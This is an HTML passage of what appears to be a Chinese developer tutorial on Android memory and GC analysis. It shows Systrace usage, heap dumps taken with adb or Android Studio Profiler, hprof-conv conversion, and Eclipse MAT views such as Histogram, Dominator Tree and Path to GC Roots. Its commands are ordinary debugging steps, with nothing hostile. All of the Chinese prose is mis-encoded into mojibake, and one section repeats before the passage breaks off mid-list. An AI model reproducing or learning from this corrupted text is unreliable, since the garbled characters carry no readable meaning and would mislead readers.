<li>åœ¨Android Studioä¸­ï¼Œç‚¹å‡»"Tools" â†’ "Android" â†’ "Device Monitor"</li>
<li>é€‰æ‹©è¦åˆ†æçš„åº”ç”¨</li>
<li>ç‚¹å‡»"Systrace"æŒ‰é’®</li>
<li>è®¾ç½®è®°å½•æ—¶é—´ï¼ˆæ¯”å¦‚10ç§’ï¼‰</li>
<li>æ“ä½œåº”ç”¨ï¼ˆæ¯”å¦‚æ»‘åŠ¨åˆ—è¡¨ï¼‰</li>
<li>åœæ­¢è®°å½•ï¼ŒæŸ¥çœ‹ç»“æœ</li>
</ol>
<p><strong>æ–¹æ³•2ï¼šä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¼€å§‹è®°å½•</span>
python systrace.py -t 10 -o trace.html <span class="hljs-built_in">sched</span> freq idle am wm gfx view binder_driver hal dalvik camera input res

<span class="hljs-comment"># åœ¨è®¾å¤‡ä¸Šæ“ä½œåº”ç”¨</span>
<span class="hljs-comment"># åœæ­¢è®°å½•åï¼Œç”¨æµè§ˆå™¨æ‰“å¼€trace.htmlæŸ¥çœ‹</span>
</code></pre>
<p><strong>Systraceèƒ½åˆ†æä»€ä¹ˆï¼š</strong></p>
<ol>
<li>
<p><strong>GCæš‚åœæ—¶é—´</strong></p>
<ul>
<li>å¯ä»¥çœ‹åˆ°GCåœ¨ä¸»çº¿ç¨‹ä¸Šçš„æ‰§è¡Œæ—¶é—´</li>
<li>å¯ä»¥çœ‹åˆ°GCæš‚åœäº†å¤šä¹…</li>
<li>å¯ä»¥åˆ¤æ–­GCæ˜¯å¦å¯¼è‡´å¡é¡¿</li>
</ul>
</li>
<li>
<p><strong>GCå¯¹ä¸»çº¿ç¨‹çš„å½±å“</strong></p>
<ul>
<li>å¯ä»¥çœ‹åˆ°ä¸»çº¿ç¨‹åœ¨GCæœŸé—´è¢«é˜»å¡</li>
<li>å¯ä»¥çœ‹åˆ°GCå¯¼è‡´çš„å¸§ç‡ä¸‹é™</li>
<li>å¯ä»¥åˆ†æGCå¯¹ç”¨æˆ·ä½“éªŒçš„å½±å“</li>
</ul>
</li>
<li>
<p><strong>åº”ç”¨å¡é¡¿çš„åŸå› </strong></p>
<ul>
<li>å¯ä»¥çœ‹åˆ°å¡é¡¿æ˜¯å¦ç”±GCå¼•èµ·</li>
<li>å¯ä»¥çœ‹åˆ°GCå’Œå…¶ä»–æ“ä½œçš„æ—¶åºå…³ç³»</li>
<li>å¯ä»¥æ‰¾å‡ºæ€§èƒ½ç“¶é¢ˆ</li>
</ul>
</li>
</ol>
<p><strong>å¦‚ä½•æŸ¥çœ‹Systraceç»“æœï¼š</strong></p>
<ol>
<li>
<p><strong>æŸ¥çœ‹ä¸»çº¿ç¨‹</strong></p>
<ul>
<li>æ‰¾åˆ°"main"çº¿ç¨‹</li>
<li>æŸ¥çœ‹æ˜¯å¦æœ‰çº¢è‰²çš„å¸§ï¼ˆè¡¨ç¤ºæ‰å¸§ï¼‰</li>
<li>æŸ¥çœ‹æ˜¯å¦æœ‰GCäº‹ä»¶</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
<li>æ‰¾åˆ°"GC"ç›¸å…³çš„äº‹ä»¶</li>
<li>æŸ¥çœ‹GCçš„æŒç»­æ—¶é—´</li>
<li>æŸ¥çœ‹GCæ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
</ul>
</li>
<li>
<p><strong>åˆ†æå¡é¡¿åŸå› </strong></p>
<ul>
<li>å¦‚æœå¡é¡¿æ—¶é—´ä¸GCæ—¶é—´å¯¹åº”ï¼Œè¯´æ˜GCå¯¼è‡´å¡é¡¿</li>
<li>å¦‚æœGCé¢‘ç¹ï¼Œéœ€è¦ä¼˜åŒ–ä»£ç å‡å°‘GC</li>
<li>å¦‚æœGCæš‚åœæ—¶é—´é•¿ï¼Œéœ€è¦é¿å…Full GC</li>
</ul>
</li>
</ol>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>åˆ†æåº”ç”¨å¡é¡¿é—®é¢˜</li>
<li>åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
<li>ä¼˜åŒ–GCæ€§èƒ½</li>
</ul>
<h4 data-id="heading-66">5.1.4 MATï¼ˆMemory Analyzer Toolï¼Œåˆ†æå †è½¬å‚¨ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> åˆ†æå †è½¬å‚¨æ–‡ä»¶ï¼Œè¯¦ç»†åˆ†æå†…å­˜é—®é¢˜ï¼Œæ‰¾å‡ºå†…å­˜æ³„æ¼å’Œå¤§å¯¹è±¡</p>
<p><strong>MATæ˜¯ä»€ä¹ˆï¼š</strong></p>
<ul>
<li>Eclipse Memory Analyzer Tool</li>
<li>ä¸“é—¨ç”¨äºåˆ†æJavaå †è½¬å‚¨æ–‡ä»¶çš„å·¥å…·</li>
<li>å¯ä»¥è¯¦ç»†åˆ†æå¯¹è±¡çš„å†…å­˜å ç”¨å’Œå¼•ç”¨å…³ç³»</li>
</ul>
<p><strong>MATä¸‹è½½å’Œå®‰è£…ï¼š</strong></p>
<p><strong>1. ä¸‹è½½MAT</strong></p>
<ul>
<li>è®¿é—®Eclipseå®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.eclipse.org%2Fmat%2F" target="_blank" title="https://www.eclipse.org/mat/" ref="nofollow noopener noreferrer">www.eclipse.org/mat/</a></li>
<li>ä¸‹è½½MATå®‰è£…åŒ…ï¼ˆWindows/Mac/Linuxï¼‰</li>
<li>æˆ–è€…ä¸‹è½½ç‹¬ç«‹ç‰ˆæœ¬ï¼ˆä¸éœ€è¦Eclipseï¼‰</li>
</ul>
<p><strong>2. å®‰è£…MAT</strong></p>
<ul>
<li>Windowsï¼šè§£å‹ä¸‹è½½çš„æ–‡ä»¶ï¼Œè¿è¡ŒMemoryAnalyzer.exe</li>
<li>Mac/Linuxï¼šè§£å‹ä¸‹è½½çš„æ–‡ä»¶ï¼Œè¿è¡ŒMemoryAnalyzerå¯æ‰§è¡Œæ–‡ä»¶</li>
<li>ç¡®ä¿å·²å®‰è£…Javaï¼ˆMATéœ€è¦Javaè¿è¡Œç¯å¢ƒï¼‰</li>
</ul>
<p><strong>Android Studioç”Ÿæˆå †è½¬å‚¨çš„è¯¦ç»†æ­¥éª¤ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šä½¿ç”¨Android Studio Profilerï¼ˆæ¨èï¼‰</strong></p>
<p><strong>æ­¥éª¤1ï¼šæ‰“å¼€Profiler</strong></p>
<ul>
<li>åœ¨Android Studioä¸­ï¼Œç‚¹å‡»åº•éƒ¨å·¥å…·æ çš„"Profiler"æ ‡ç­¾</li>
<li>æˆ–é€šè¿‡èœå•ï¼šView â†’ Tool Windows â†’ Profiler</li>
<li>ç¡®ä¿åº”ç”¨æ­£åœ¨è¿è¡Œï¼ˆdebugæ¨¡å¼ï¼‰</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šé€‰æ‹©åº”ç”¨è¿›ç¨‹</strong></p>
<ul>
<li>åœ¨Profilerçª—å£ä¸­ï¼Œé€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</li>
<li>ç¡®ä¿åº”ç”¨æ­£åœ¨è¿è¡Œ</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šæ‰“å¼€Memory Profiler</strong></p>
<ul>
<li>ç‚¹å‡»"Memory"æ ‡ç­¾</li>
<li>æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>ç‚¹å‡»å†…å­˜æ›²çº¿å›¾ä¸‹æ–¹çš„"Heap Dump"æŒ‰é’®ï¼ˆåƒåœ¾æ¡¶å›¾æ ‡ï¼‰</li>
<li>ç­‰å¾…ç”Ÿæˆå®Œæˆï¼ˆå¯èƒ½éœ€è¦å‡ ç§’åˆ°å‡ åç§’ï¼Œå–å†³äºå †å¤§å°ï¼‰</li>
<li>ç”Ÿæˆå®Œæˆåï¼Œä¼šåœ¨ä¸‹æ–¹æ˜¾ç¤ºå †è½¬å‚¨ä¿¡æ¯</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šå¯¼å‡ºhprofæ–‡ä»¶</strong></p>
<ul>
<li>åœ¨å †è½¬å‚¨ä¿¡æ¯åŒºåŸŸï¼Œç‚¹å‡»"Export heap dump"æŒ‰é’®</li>
<li>é€‰æ‹©ä¿å­˜ä½ç½®ï¼Œä¿å­˜ä¸º.hprofæ–‡ä»¶</li>
<li>æ¯”å¦‚ï¼š<code>heap.hprof</code></li>
</ul>
<p><strong>æ–¹æ³•2ï¼šä½¿ç”¨å‘½ä»¤è¡Œç”Ÿæˆå †è½¬å‚¨</strong></p>
<p><strong>æ­¥éª¤1ï¼šæ‰¾åˆ°åº”ç”¨è¿›ç¨‹ID</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰åº”ç”¨è¿›ç¨‹</span>
adb shell ps | grep ä½ çš„åº”ç”¨åŒ…å

<span class="hljs-comment"># æˆ–è€…</span>
adb shell ps -A | grep ä½ çš„åº”ç”¨åŒ…å
</code></pre>
<p><strong>æ­¥éª¤2ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹æ³•1ï¼šä½¿ç”¨amå‘½ä»¤ï¼ˆéœ€è¦rootæƒé™æˆ–debugç‰ˆæœ¬ï¼‰</span>
adb shell am dumpheap &lt;pid&gt; /data/local/tmp/heap.hprof

<span class="hljs-comment"># æ–¹æ³•2ï¼šä½¿ç”¨killå‘½ä»¤ï¼ˆå‘é€ä¿¡å·ï¼‰</span>
adb shell <span class="hljs-built_in">kill</span> -10 &lt;pid&gt;

<span class="hljs-comment"># æ–¹æ³•3ï¼šåœ¨ä»£ç ä¸­ç”Ÿæˆï¼ˆå¼€å‘æ—¶ï¼‰</span>
Debug.dumpHprofData(<span class="hljs-string">"/data/local/tmp/heap.hprof"</span>);
</code></pre>
<p><strong>æ­¥éª¤3ï¼šä»è®¾å¤‡æ‹‰å–hprofæ–‡ä»¶</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä»è®¾å¤‡æ‹‰å–åˆ°æœ¬åœ°</span>
adb pull /data/local/tmp/heap.hprof ./
</code></pre>
<p><strong>è½¬æ¢hprofæ–‡ä»¶æ ¼å¼çš„è¯¦ç»†æ­¥éª¤ï¼š</strong></p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦è½¬æ¢ï¼š</strong></p>
<ul>
<li>Androidçš„hprofæ–‡ä»¶æ ¼å¼ä¸æ ‡å‡†Javaä¸åŒ</li>
<li>MATæ— æ³•ç›´æ¥æ‰“å¼€Androidçš„hprofæ–‡ä»¶</li>
<li>éœ€è¦ä½¿ç”¨Android SDKçš„hprof-convå·¥å…·è½¬æ¢</li>
</ul>
<p><strong>æ­¥éª¤1ï¼šæ‰¾åˆ°hprof-convå·¥å…·</strong></p>
<ul>
<li>hprof-convå·¥å…·ä½äºAndroid SDKçš„platform-toolsç›®å½•</li>
<li>Windowsï¼š<code>%LOCALAPPDATA%\Android\Sdk\platform-tools\hprof-conv.exe</code></li>
<li>Mac/Linuxï¼š<code>~/Library/Android/sdk/platform-tools/hprof-conv</code></li>
</ul>
<p><strong>æ­¥éª¤2ï¼šè½¬æ¢hprofæ–‡ä»¶</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Windows</span>
hprof-conv.exe heap.hprof heap-converted.hprof

<span class="hljs-comment"># Mac/Linux</span>
./hprof-conv heap.hprof heap-converted.hprof

<span class="hljs-comment"># æˆ–è€…ä½¿ç”¨å®Œæ•´è·¯å¾„</span>
C:\Users\ä½ çš„ç”¨æˆ·å\AppData\Local\Android\Sdk\platform-tools\hprof-conv.exe heap.hprof heap-converted.hprof
</code></pre>
<p><strong>æ­¥éª¤3ï¼šéªŒè¯è½¬æ¢ç»“æœ</strong></p>
<ul>
<li>è½¬æ¢å®Œæˆåï¼Œä¼šç”Ÿæˆheap-converted.hprofæ–‡ä»¶</li>
<li>æ–‡ä»¶å¤§å°åº”è¯¥ä¸åŸå§‹æ–‡ä»¶ç›¸ä¼¼</li>
<li>ç°åœ¨å¯ä»¥ç”¨MATæ‰“å¼€äº†</li>
</ul>
<p><strong>MATæ‰“å¼€å’Œåˆ†æçš„è¯¦ç»†æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šæ‰“å¼€MAT</strong></p>
<ul>
<li>è¿è¡ŒMATï¼ˆMemoryAnalyzer.exeæˆ–MemoryAnalyzerï¼‰</li>
<li>ç­‰å¾…MATå¯åŠ¨å®Œæˆ</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šæ‰“å¼€hprofæ–‡ä»¶</strong></p>
<ul>
<li>ç‚¹å‡»"File" â†’ "Open Heap Dump"</li>
<li>æˆ–è€…ç›´æ¥æ‹–æ‹½hprofæ–‡ä»¶åˆ°MATçª—å£</li>
<li>é€‰æ‹©è½¬æ¢åçš„hprofæ–‡ä»¶ï¼ˆheap-converted.hprofï¼‰</li>
<li>ç‚¹å‡»"Open"</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šç­‰å¾…MATåˆ†æ</strong></p>
<ul>
<li>MATä¼šè‡ªåŠ¨åˆ†æå †è½¬å‚¨æ–‡ä»¶</li>
<li>åˆ†ææ—¶é—´å–å†³äºå †å¤§å°ï¼ˆå¯èƒ½éœ€è¦å‡ åˆ†é’Ÿï¼‰</li>
<li>åˆ†æå®Œæˆåï¼Œä¼šæ˜¾ç¤ºåˆ†æç»“æœ</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šæŸ¥çœ‹Leak Suspectsï¼ˆæ³„æ¼å«Œç–‘ï¼‰</strong></p>
<ul>
<li>MATä¼šè‡ªåŠ¨æ£€æµ‹å¯èƒ½çš„å†…å­˜æ³„æ¼</li>
<li>ç‚¹å‡»"Leak Suspects"æ ‡ç­¾</li>
<li>æŸ¥çœ‹MATè‡ªåŠ¨ç”Ÿæˆçš„æ³„æ¼æŠ¥å‘Š</li>
<li>æŠ¥å‘Šä¼šæ˜¾ç¤ºå¯ç–‘çš„æ³„æ¼å¯¹è±¡å’Œå¼•ç”¨é“¾</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šä½¿ç”¨Histogramï¼ˆç›´æ–¹å›¾ï¼‰åˆ†æ</strong></p>
<ul>
<li>ç‚¹å‡»"Histogram"æ ‡ç­¾</li>
<li>æŸ¥çœ‹æ‰€æœ‰ç±»çš„å®ä¾‹æ•°é‡å’Œå†…å­˜å ç”¨</li>
<li><strong>æŒ‰å†…å­˜å ç”¨æ’åº</strong>ï¼š
<ul>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
</ul>
</li>
<li><strong>æŸ¥çœ‹ç±»çš„å®ä¾‹</strong>ï¼š
<ul>
<li>åŒå‡»æŸä¸ªç±»ï¼ŒæŸ¥çœ‹è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹</li>
<li>å¯ä»¥çœ‹åˆ°æ¯ä¸ªå®ä¾‹å ç”¨çš„å†…å­˜</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šä½¿ç”¨Dominator Treeï¼ˆæ”¯é…æ ‘ï¼‰åˆ†æ</strong></p>
<ul>
<li>ç‚¹å‡»"Dominator Tree"æ ‡ç­¾</li>
<li>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨å…³ç³»æ ‘</li>
<li><strong>æŒ‰å†…å­˜å ç”¨æ’åº</strong>ï¼š
<ul>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
</li>
<li><strong>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨å…³ç³»</strong>ï¼š
<ul>
<li>å±•å¼€å¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°å®ƒå¼•ç”¨çš„å…¶ä»–å¯¹è±¡</li>
<li>å¯ä»¥æ‰¾åˆ°å“ªäº›å¯¹è±¡æŒæœ‰å¤§é‡å†…å­˜</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤7ï¼šä½¿ç”¨Path to GC Rootsï¼ˆåˆ°GC Rootsçš„è·¯å¾„ï¼‰åˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li><strong>é€‰æ‹©å¯¹è±¡</strong>ï¼š
<ul>
<li>åœ¨Histogramæˆ–Dominator Treeä¸­ï¼Œå³é”®ç‚¹å‡»å¯ç–‘å¯¹è±¡</li>
<li>é€‰æ‹©"Path to GC Roots" â†’ "exclude weak references"ï¼ˆæ’é™¤å¼±å¼•ç”¨ï¼‰</li>
</ul>
</li>
<li><strong>æŸ¥çœ‹å¼•ç”¨é“¾</strong>ï¼š
<ul>
<li>MATä¼šæ˜¾ç¤ºå¯¹è±¡åˆ°GC Rootsçš„å®Œæ•´å¼•ç”¨é“¾</li>
<li>å¯ä»¥çœ‹åˆ°æ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
<li>æ‰¾å‡ºæ³„æ¼çš„åŸå› </li>
</ul>
</li>
</ul>
<p><strong>MATåˆ†æå†…å­˜æ³„æ¼çš„å®é™…æ“ä½œç¤ºä¾‹ï¼š</strong></p>
<p><strong>åœºæ™¯ï¼šActivityæ³„æ¼</strong></p>
<p><strong>æ­¥éª¤1ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨Android Studio Profilerä¸­ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯¼å‡ºä¸ºheap.hprof</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šè½¬æ¢æ–‡ä»¶</strong></p>
<pre><code class="hljs language-bash" lang="bash">hprof-conv heap.hprof heap-converted.hprof
</code></pre>
<p><strong>æ­¥éª¤3ï¼šç”¨MATæ‰“å¼€</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€heap-converted.hprof</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šæŸ¥æ‰¾æ³„æ¼çš„Activity</strong></p>
<ul>
<li>æ‰“å¼€Histogram</li>
<li>åœ¨æœç´¢æ¡†è¾“å…¥"Activity"</li>
<li>æ‰¾åˆ°MyActivityç±»</li>
<li>æŸ¥çœ‹å®ä¾‹æ•°é‡ï¼ˆå¦‚æœæœ‰å¤šä¸ªå®ä¾‹ï¼Œå¯èƒ½æœ‰æ³„æ¼ï¼‰</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šåˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li>å³é”®ç‚¹å‡»MyActivityå®ä¾‹</li>
<li>é€‰æ‹©"Path to GC Roots" â†’ "exclude weak references"</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼Œæ¯”å¦‚ï¼š
<pre><code class="hljs language-scss" lang="scss">MyActivityå®ä¾‹
  â†‘ (è¢«å¼•ç”¨)
static MyActivity<span class="hljs-selector-class">.activity</span> (é™æ€å˜é‡)
  â†‘ (GC Root)
</code></pre>
</li>
<li>æ‰¾å‡ºæ˜¯é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šå®šä½ä»£ç </strong></p>
<ul>
<li>æ ¹æ®å¼•ç”¨é“¾ï¼Œå®šä½åˆ°ä»£ç ä¸­çš„é™æ€å˜é‡</li>
<li>ä¿®å¤ä»£ç ï¼ˆä½¿ç”¨å¼±å¼•ç”¨æˆ–åŠæ—¶æ¸…ç†ï¼‰</li>
</ul>
<p><strong>MATçš„ä¸»è¦åŠŸèƒ½è¯¦ç»†è¯´æ˜ï¼š</strong></p>
<p><strong>1. Histogramï¼ˆç›´æ–¹å›¾ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºæ‰€æœ‰ç±»çš„å®ä¾‹æ•°é‡å’Œå†…å­˜å ç”¨</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Histogram"è§†å›¾</li>
<li>åœ¨æœç´¢æ¡†è¾“å…¥ç±»åï¼ŒæŸ¥æ‰¾ç‰¹å®šç±»</li>
<li>ç‚¹å‡»åˆ—æ ‡é¢˜æ’åºï¼ˆæ¯”å¦‚æŒ‰"Retained Heap"æ’åºï¼‰</li>
<li>åŒå‡»ç±»åï¼ŒæŸ¥çœ‹è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
</ul>
<p><strong>2. Dominator Treeï¼ˆæ”¯é…æ ‘ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºå¯¹è±¡çš„å¼•ç”¨å…³ç³»æ ‘ï¼Œæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Dominator Tree"è§†å›¾</li>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>å±•å¼€å¯¹è±¡ï¼ŒæŸ¥çœ‹å¼•ç”¨å…³ç³»</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
<p><strong>3. Path to GC Rootsï¼ˆåˆ°GC Rootsçš„è·¯å¾„ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºå¯¹è±¡åˆ°GC Rootsçš„å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>å³é”®ç‚¹å‡»å¯ç–‘å¯¹è±¡</li>
<li>é€‰æ‹©"Path to GC Roots"</li>
<li>é€‰æ‹©"exclude weak references"ï¼ˆæ’é™¤å¼±å¼•ç”¨ï¼‰</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šåˆ†æå†…å­˜æ³„æ¼çš„åŸå› </li>
</ul>
<p><strong>4. Leak Suspectsï¼ˆæ³„æ¼å«Œç–‘ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šMATè‡ªåŠ¨æ£€æµ‹å¯èƒ½çš„å†…å­˜æ³„æ¼ï¼Œç”Ÿæˆæ³„æ¼æŠ¥å‘Š</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Leak Suspects"è§†å›¾</li>
<li>æŸ¥çœ‹MATè‡ªåŠ¨æ£€æµ‹çš„æ³„æ¼æŠ¥å‘Š</li>
<li>æ ¹æ®æŠ¥å‘Šåˆ†ææ³„æ¼åŸå› </li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¿«é€Ÿå®šä½å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>5. OQLï¼ˆObject Query Languageï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šä½¿ç”¨ç±»ä¼¼SQLçš„æŸ¥è¯¢è¯­è¨€æŸ¥è¯¢å¯¹è±¡</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"OQL"è§†å›¾</li>
<li>è¾“å…¥æŸ¥è¯¢è¯­å¥ï¼Œæ¯”å¦‚ï¼š
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> java.lang.String <span class="hljs-keyword">WHERE</span> this.value.length <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>
</code></pre>
</li>
<li>æ‰§è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥çœ‹ç»“æœ</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæŸ¥æ‰¾ç‰¹å®šæ¡ä»¶çš„å¯¹è±¡</li>
</ul>
<p><strong>MATåˆ†ææŠ€å·§ï¼š</strong></p>
<p><strong>1. å¯¹æ¯”å¤šä¸ªå †è½¬å‚¨</strong></p>
<ul>
<li>ç”Ÿæˆå¤šä¸ªæ—¶é—´ç‚¹çš„å †è½¬å‚¨</li>
<li>å¯¹æ¯”åˆ†æï¼Œæ‰¾å‡ºå†…å­˜å¢é•¿çš„åŸå› </li>
<li>å¯ä»¥çœ‹åˆ°å“ªäº›å¯¹è±¡åœ¨å¢é•¿</li>
</ul>
<p><strong>2. ä½¿ç”¨OQLæŸ¥è¯¢</strong></p>
<ul>
<li>ä½¿ç”¨OQLæŸ¥è¯¢ç‰¹å®šå¯¹è±¡</li>
<li>æ¯”å¦‚ï¼šæŸ¥è¯¢æ‰€æœ‰Activityå®ä¾‹</li>
<li>åˆ†æè¿™äº›å¯¹è±¡æ˜¯å¦åº”è¯¥å­˜åœ¨</li>
</ul>
<p><strong>3. å…³æ³¨Retained Heap</strong></p>
<ul>
<li>Retained Heapè¡¨ç¤ºå¯¹è±¡åŠå…¶å¼•ç”¨çš„å¯¹è±¡å ç”¨çš„æ€»å†…å­˜</li>
<li>å…³æ³¨Retained Heapå¤§çš„å¯¹è±¡</li>
<li>è¿™äº›å¯¹è±¡å¯èƒ½æ˜¯å†…å­˜æ³„æ¼çš„æ ¹æº</li>
</ul>
<p><strong>4. æ’é™¤å¼±å¼•ç”¨</strong></p>
<ul>
<li>åœ¨Path to GC Rootsæ—¶ï¼Œé€‰æ‹©"exclude weak references"</li>
<li>å¼±å¼•ç”¨ä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«å›æ”¶ï¼Œå¯ä»¥æ’é™¤</li>
<li>åªå…³æ³¨å¼ºå¼•ç”¨ï¼Œæ‰¾å‡ºçœŸæ­£çš„æ³„æ¼åŸå› </li>
</ul>
<p><strong>å¸¸è§é—®é¢˜ï¼š</strong></p>
<p><strong>1. MATæ— æ³•æ‰“å¼€hprofæ–‡ä»¶</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šAndroidçš„hprofæ ¼å¼ä¸æ ‡å‡†Javaä¸åŒ</li>
<li><strong>è§£å†³</strong>ï¼šä½¿ç”¨hprof-convå·¥å…·è½¬æ¢åå†æ‰“å¼€</li>
</ul>
<p><strong>2. MATåˆ†æå¾ˆæ…¢</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šå †è½¬å‚¨æ–‡ä»¶å¾ˆå¤§</li>
<li><strong>è§£å†³</strong>ï¼šç­‰å¾…åˆ†æå®Œæˆï¼Œæˆ–è€…å‡å°å †è½¬å‚¨å¤§å°</li>
</ul>
<p><strong>3. æ‰¾ä¸åˆ°æ³„æ¼å¯¹è±¡</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šæ³„æ¼å¯¹è±¡å¯èƒ½ä¸åœ¨å½“å‰å †è½¬å‚¨ä¸­</li>
<li><strong>è§£å†³</strong>ï¼šåœ¨åˆé€‚çš„æ—¶æœºç”Ÿæˆå †è½¬å‚¨ï¼Œæˆ–è€…ä½¿ç”¨LeakCanary</li>
</ul>
<p><strong>4. å¼•ç”¨é“¾å¤ªå¤æ‚</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šå¯¹è±¡å¼•ç”¨å…³ç³»å¤æ‚</li>
<li><strong>è§£å†³</strong>ï¼šä»æœ€å¯ç–‘çš„å¯¹è±¡å¼€å§‹åˆ†æï¼Œé€æ­¥ç¼©å°èŒƒå›´</li>
</ul>
<p><strong>MATçš„ä¸»è¦åŠŸèƒ½è¯¦ç»†è¯´æ˜ï¼š</strong></p>
<p><strong>1. Histogramï¼ˆç›´æ–¹å›¾ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºæ‰€æœ‰ç±»çš„å®ä¾‹æ•°é‡å’Œå†…å­˜å ç”¨</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Histogram"è§†å›¾</li>
<li>åœ¨æœç´¢æ¡†è¾“å…¥ç±»åï¼ŒæŸ¥æ‰¾ç‰¹å®šç±»</li>
<li>ç‚¹å‡»åˆ—æ ‡é¢˜æ’åºï¼ˆæ¯”å¦‚æŒ‰"Retained Heap"æ’åºï¼‰</li>
